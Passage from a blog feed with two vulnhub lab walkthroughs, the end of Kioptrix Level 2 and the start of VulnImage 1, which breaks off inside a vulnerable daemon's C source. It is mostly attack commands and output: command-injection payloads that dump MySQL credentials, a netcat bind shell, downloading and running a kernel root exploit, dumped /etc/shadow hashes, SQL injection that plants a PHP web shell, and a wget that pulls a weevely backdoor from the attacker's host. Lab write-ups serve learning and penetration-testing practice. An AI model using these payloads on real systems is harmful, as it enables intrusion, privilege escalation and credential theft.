</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
</span><span class='line'>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
</span><span class='line'>rpm:x:37:37::/var/lib/rpm:/sbin/nologin
</span><span class='line'>haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
</span><span class='line'>netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
</span><span class='line'>nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
</span><span class='line'>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
</span><span class='line'>rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
</span><span class='line'>mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
</span><span class='line'>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
</span><span class='line'>nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
</span><span class='line'>pcap:x:77:77::/var/arpwatch:/sbin/nologin
</span><span class='line'>apache:x:48:48:Apache:/var/www:/sbin/nologin
</span><span class='line'>squid:x:23:23::/var/spool/squid:/sbin/nologin
</span><span class='line'>webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
</span><span class='line'>xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
</span><span class='line'>pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
</span><span class='line'>john:x:500:500::/home/john:/bin/bash
</span><span class='line'>harold:x:501:501::/home/harold:/bin/bash
</span><span class='line'>&lt;/pre></span></code></pre></td></tr></table></div></figure>


<p>Web server fingerprints:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.0.52 (CentOS)
</span><span class='line'>+ Retrieved x-powered-by header: PHP/4.3.9</span></code></pre></td></tr></table></div></figure>


<p>We don&rsquo;t have writable access under DocumentRoot. Looking to different
directories, we found the netcat source remains.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>drwxrwxrwx  7 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1
</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc
</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc/drafts
</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/po
</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib
</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib/contrib
</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/src
</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/m4
</span><span class='line'>drwxrwxr-x  5 root sys 4096 Oct  7  2009 /etc/cups
</span><span class='line'>drwxr-xrwx  4 root root 4096 May  9 12:11 /tmp
</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:17 /tmp/.ICE-unix
</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:18 /tmp/.font-unix</span></code></pre></td></tr></table></div></figure>


<p>So there should be netcat installed, we will need this information later.</p>

<p>We can read index.php for mysql credentials:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 cat index.php&submit=submit
</span><span class='line'>..
</span><span class='line'>&lt;?php
</span><span class='line'>  mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
</span><span class='line'>  //print "Connected to MySQL&lt;br />";
</span><span class='line'>  mysql_select_db("webapp");
</span><span class='line'>  
</span><span class='line'>  if ($_POST['uname'] != ""){
</span><span class='line'>      $username = $_POST['uname'];
</span><span class='line'>      $password = $_POST['psw'];
</span><span class='line'>      $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
</span><span class='line'>      //print $query."&lt;br>";
</span><span class='line'>      $result = mysql_query($query);
</span><span class='line'>
</span><span class='line'>      $row = mysql_fetch_array($result);
</span><span class='line'>      //print "ID: ".$row['id']."&lt;br />";
</span><span class='line'>  }
</span><span class='line'>
</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>


<p>The john&rsquo;s password doesn&rsquo;t work for ssh, but at least we can extract more from
mysql database:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&submit=submit
</span><span class='line'>Database
</span><span class='line'>mysql
</span><span class='line'>test
</span><span class='line'>webapp
</span><span class='line'>
</span><span class='line'>ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
</span><span class='line'>id    username    password
</span><span class='line'>1 admin   5afac8d85f
</span><span class='line'>2 john    66lajGGbla</span></code></pre></td></tr></table></div></figure>


<p>Again, the passwords don&rsquo;t work for ssh.</p>

<p>We find netcat and use it to bind a shell, then we try to root the box:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 find / -iname \*netcat\*&submit=submit
</span><span class='line'>..
</span><span class='line'>/usr/share/zsh/4.2.0/functions/_netcat
</span><span class='line'>/usr/local/info/netcat.info
</span><span class='line'>/usr/local/share/locale/sk/LC_MESSAGES/netcat.mo
</span><span class='line'>/usr/local/share/locale/it/LC_MESSAGES/netcat.mo
</span><span class='line'>/usr/local/man/man1/netcat.1
</span><span class='line'>/usr/local/bin/netcat
</span><span class='line'>/usr/src/netcat-0.7.1
</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.1
</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.info
</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.texi
</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.pod
</span><span class='line'>/usr/src/netcat-0.7.1/po/netcat.pot
</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.c
</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.h
</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.o
</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 /usr/local/bin/netcat -e /bin/sh -l -p 1337&submit=submit</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# nc 192.168.80.144 1337
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
</span><span class='line'>
</span><span class='line'>uname -a
</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>


<p>Luckily, exploitdb contains local root exploit with exactly this version of kernel:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# grep -irn '2.6.9-55.EL' *
</span><span class='line'>platforms/linux/local/9542.c:7:** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),</span></code></pre></td></tr></table></div></figure>


<p>As our last step, we download and compile this exploit
<a href="https://www.exploit-db.com/exploits/9542/">https://www.exploit-db.com/exploits/9542/</a> .</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cd /tmp/
</span><span class='line'>wget https://www.exploit-db.com/download/9542 -O 9542.c --no-check-certificate
</span><span class='line'>
</span><span class='line'>gcc 9542.c
</span><span class='line'>./a.out
</span><span class='line'>sh: no job control in this shell
</span><span class='line'>sh-3.00# id
</span><span class='line'>uid=0(root) gid=0(root) groups=48(apache)
</span><span class='line'>sh-3.00# 
</span><span class='line'>
</span><span class='line'>sh-3.00# cat /etc/shadow
</span><span class='line'>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
</span><span class='line'>bin:*:14525:0:99999:7:::
</span><span class='line'>daemon:*:14525:0:99999:7:::
</span><span class='line'>adm:*:14525:0:99999:7:::
</span><span class='line'>lp:*:14525:0:99999:7:::
</span><span class='line'>sync:*:14525:0:99999:7:::
</span><span class='line'>shutdown:*:14525:0:99999:7:::
</span><span class='line'>halt:*:14525:0:99999:7:::
</span><span class='line'>mail:*:14525:0:99999:7:::
</span><span class='line'>news:*:14525:0:99999:7:::
</span><span class='line'>uucp:*:14525:0:99999:7:::
</span><span class='line'>operator:*:14525:0:99999:7:::
</span><span class='line'>games:*:14525:0:99999:7:::
</span><span class='line'>gopher:*:14525:0:99999:7:::
</span><span class='line'>ftp:*:14525:0:99999:7:::
</span><span class='line'>nobody:*:14525:0:99999:7:::
</span><span class='line'>dbus:!!:14525:0:99999:7:::
</span><span class='line'>vcsa:!!:14525:0:99999:7:::
</span><span class='line'>rpm:!!:14525:0:99999:7:::
</span><span class='line'>haldaemon:!!:14525:0:99999:7:::
</span><span class='line'>netdump:!!:14525:0:99999:7:::
</span><span class='line'>nscd:!!:14525:0:99999:7:::
</span><span class='line'>sshd:!!:14525:0:99999:7:::
</span><span class='line'>rpc:!!:14525:0:99999:7:::
</span><span class='line'>mailnull:!!:14525:0:99999:7:::
</span><span class='line'>smmsp:!!:14525:0:99999:7:::
</span><span class='line'>rpcuser:!!:14525:0:99999:7:::
</span><span class='line'>nfsnobody:!!:14525:0:99999:7:::
</span><span class='line'>pcap:!!:14525:0:99999:7:::
</span><span class='line'>apache:!!:14525:0:99999:7:::
</span><span class='line'>squid:!!:14525:0:99999:7:::
</span><span class='line'>webalizer:!!:14525:0:99999:7:::
</span><span class='line'>xfs:!!:14525:0:99999:7:::
</span><span class='line'>ntp:!!:14525:0:99999:7:::
</span><span class='line'>pegasus:!!:14525:0:99999:7:::
</span><span class='line'>mysql:!!:14525::::::
</span><span class='line'>john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
</span><span class='line'>harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
</span><span class='line'>sh-3.00#</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[VulnImage: 1]]></title>
    <link href="http://73696e65.github.io/blog/2015/05/10/vulnimage-1/"/>
    <updated>2015-05-10T15:18:05+02:00</updated>
    <id>http://73696e65.github.io/blog/2015/05/10/vulnimage-1</id>
    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>

<p>Nmap output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
</span><span class='line'>22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
</span><span class='line'>25/tcp   open  smtp        Exim smtpd 4.50
</span><span class='line'>80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
</span><span class='line'>3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
</span><span class='line'>7777/tcp open  cbt?</span></code></pre></td></tr></table></div></figure>


<p>With dirb we found a few interesting directories (repo, admin, profiles),
directory listing is enabled:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.80.143/ ----
</span><span class='line'>+ http://192.168.80.143/index (CODE:200|SIZE:71)    
</span><span class='line'>+ http://192.168.80.143/view (CODE:200|SIZE:166)    
</span><span class='line'>==> DIRECTORY: http://192.168.80.143/admin/    
</span><span class='line'>==> DIRECTORY: http://192.168.80.143/profiles/    
</span><span class='line'>==> DIRECTORY: http://192.168.80.143/repo/    
</span><span class='line'>+ http://192.168.80.143/myblog (CODE:200|SIZE:736)    
</span><span class='line'>+ http://192.168.80.143/server-status (CODE:403|SIZE:332)</span></code></pre></td></tr></table></div></figure>


<p>Submitting the quote gives an error SQL message:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/admin/profile.php
</span><span class='line'>Username: '
</span><span class='line'>Password a
</span><span class='line'>
</span><span class='line'>... 
</span><span class='line'>SELECT * FROM blog_users WHERE poster = ''' AND password = 'a'</span></code></pre></td></tr></table></div></figure>


<p>After a few minutes of playing with requests we realize that we can create
files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>POST /admin/profile.php HTTP/1.1
</span><span class='line'>Host: 192.168.80.143
</span><span class='line'>User-Agent: Mozilla/5.0
</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span><span class='line'>Accept-Language: en-US,en;q=0.5
</span><span class='line'>Accept-Encoding: gzip, deflate
</span><span class='line'>DNT: 1
</span><span class='line'>Referer: http://192.168.80.143/admin/profile.php
</span><span class='line'>Connection: keep-alive
</span><span class='line'>Cache-Control: max-age=0
</span><span class='line'>Content-Type: application/x-www-form-urlencoded
</span><span class='line'>Content-Length: 104
</span><span class='line'>
</span><span class='line'>username=testa&password=test' or '2'='2&sig=&lt;?php system($_REQUEST['cmd']); ?>&fname=x.php&submit=Submit</span></code></pre></td></tr></table></div></figure>


<p>Now we have a simple PHP shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=id
</span><span class='line'>
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure>


<p>We download the weevely.php from our server and connect:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/profiles/testa-x.php?cmd=wget 192.168.80.137/weevely.php.txt -O c.php
</span><span class='line'>root@kali32:~# weevely http://192.168.80.143/profiles/c.php 1234</span></code></pre></td></tr></table></div></figure>


<p>In the repo directory, we examine the buffd.c. It is a vulnerable daemon,
listening on port 7777.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="nl">debian</span><span class="p">:</span><span class="o">/</span><span class="n">tmp</span><span class="err">#</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">repo</span><span class="o">/</span><span class="n">buffd</span><span class="p">.</span><span class="n">c</span>
</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;unistd.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;errno.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/types.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/socket.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netinet/in.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;netdb.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;arpa/inet.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;sys/wait.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;signal.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define PORT &quot;7777&quot; </span><span class="c1">// the port users will be connecting to</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#define BACKLOG 10       </span><span class="c1">// how many pending connections queue will hold</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="n">vulnerable</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">net_buffer</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="kt">char</span> <span class="n">local_buffer</span><span class="p">[</span><span class="mi">120</span><span class="p">];</span>
</span><span class='line'><span class="n">strcpy</span><span class="p">(</span><span class="n">local_buffer</span><span class="p">,</span> <span class="n">net_buffer</span><span class="p">);</span>
</span><span class='line'><span class="k">return</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="n">sigchld_handler</span><span class="p">(</span><span class="kt">int</span> <span class="n">s</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">while</span><span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">WNOHANG</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// get sockaddr, IPv4 or IPv6:</span>
</span><span class='line'><span class="kt">void</span> <span class="o">*</span><span class="n">get_in_addr</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="n">sa</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="n">sa</span><span class="o">-&gt;</span><span class="n">sa_family</span> <span class="o">==</span> <span class="n">AF_INET</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin_addr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="o">&amp;</span><span class="p">(((</span><span class="k">struct</span> <span class="n">sockaddr_in6</span><span class="o">*</span><span class="p">)</span><span class="n">sa</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">sin6_addr</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'><span class="kt">int</span> <span class="n">sockfd</span><span class="p">,</span> <span class="n">new_fd</span><span class="p">;</span> <span class="c1">// listen on sock_fd, new connection on new_fd</span>
</span><span class='line'><span class="k">struct</span> <span class="n">addrinfo</span> <span class="n">hints</span><span class="p">,</span> <span class="o">*</span><span class="n">servinfo</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sockaddr_storage</span> <span class="n">their_addr</span><span class="p">;</span> <span class="c1">// connector&#39;s address information</span>
</span><span class='line'><span class="kt">socklen_t</span> <span class="n">sin_size</span><span class="p">;</span>
</span><span class='line'><span class="k">struct</span> <span class="n">sigaction</span> <span class="n">sa</span><span class="p">;</span>
</span><span class='line'><span class="kt">int</span> <span class="n">yes</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
</span><span class='line'><span class="kt">char</span> <span class="n">in_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">out_buffer</span><span class="p">[</span><span class="mi">20</span><span class="p">],</span> <span class="n">net_buffer</span><span class="p">[</span><span class="mi">2048</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="n">INET6_ADDRSTRLEN</span><span class="p">];</span>
</span><span class='line'><span class="kt">int</span> <span class="n">rv</span><span class="p">;</span>
</span><span class='line'>
